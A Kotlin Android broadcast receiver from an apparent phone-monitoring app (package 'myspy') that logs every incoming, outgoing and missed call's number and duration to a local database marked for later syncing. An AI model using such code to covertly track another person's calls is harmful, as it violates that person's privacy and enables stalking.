package com.myspy.android.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import com.myspy.android.data.local.db.AppDatabase
import com.myspy.android.data.local.db.entities.CallEntity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Call State Receiver
 * Monitors phone call states (ringing, off hook, idle)
 *
 * Note: For call monitoring with phone numbers, READ_PHONE_STATE and READ_CALL_LOG permissions are required.
 * On Android 9+, additional restrictions may apply.
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class CallReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "CallReceiver"
        private var lastState = TelephonyManager.CALL_STATE_IDLE
        private var callStartTime = 0L
        private var isIncoming = false
        private var savedNumber: String? = null
    }

    override fun onReceive(context: Context, intent: Intent) {
        try {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

            Log.d(TAG, "Phone state changed: $state, number: $number")

            when (state) {
                TelephonyManager.EXTRA_STATE_RINGING -> {
                    // Incoming call ringing
                    isIncoming = true
                    savedNumber = number
                    callStartTime = System.currentTimeMillis()
                    Log.i(TAG, "Incoming call from: $number")
                }

                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                    // Call answered or outgoing call started
                    if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                        // This is an outgoing call
                        isIncoming = false
                        callStartTime = System.currentTimeMillis()
                        Log.i(TAG, "Outgoing call started")
                    } else {
                        // Incoming call was answered
                        Log.i(TAG, "Incoming call answered")
                    }
                }

                TelephonyManager.EXTRA_STATE_IDLE -> {
                    // Call ended
                    if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                        // Missed call
                        savedNumber?.let { phoneNumber ->
                            saveCall(context, "MISSED", phoneNumber, 0)
                            Log.i(TAG, "Missed call from: $phoneNumber")
                        }
                    } else if (lastState == TelephonyManager.CALL_STATE_OFFHOOK) {
                        // Call was active and now ended
                        val duration = if (callStartTime > 0) {
                            (System.currentTimeMillis() - callStartTime) / 1000
                        } else {
                            0
                        }

                        val callType = if (isIncoming) "INCOMING" else "OUTGOING"
                        savedNumber?.let { phoneNumber ->
                            saveCall(context, callType, phoneNumber, duration)
                            Log.i(TAG, "$callType call ended. Duration: ${duration}s")
                        }
                    }

                    // Reset state
                    isIncoming = false
                    savedNumber = null
                    callStartTime = 0L
                }
            }

            // Update last state
            lastState = when (state) {
                TelephonyManager.EXTRA_STATE_RINGING -> TelephonyManager.CALL_STATE_RINGING
                TelephonyManager.EXTRA_STATE_OFFHOOK -> TelephonyManager.CALL_STATE_OFFHOOK
                else -> TelephonyManager.CALL_STATE_IDLE
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error in CallReceiver", e)
        }
    }

    /**
     * Save call to database
     */
    private fun saveCall(context: Context, type: String, number: String, duration: Long) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val database = AppDatabase.getInstance(context)
                val callEntity = CallEntity(
                    type = type,
                    number = number,
                    duration = duration,
                    timestamp = System.currentTimeMillis(),
                    contactName = null, // Could be resolved from contacts
                    synced = false
                )

                database.callsDao().insert(callEntity)
                Log.d(TAG, "Call saved: $type, $number, ${duration}s")
            } catch (e: Exception) {
                Log.e(TAG, "Error saving call", e)
            }
        }
    }
}
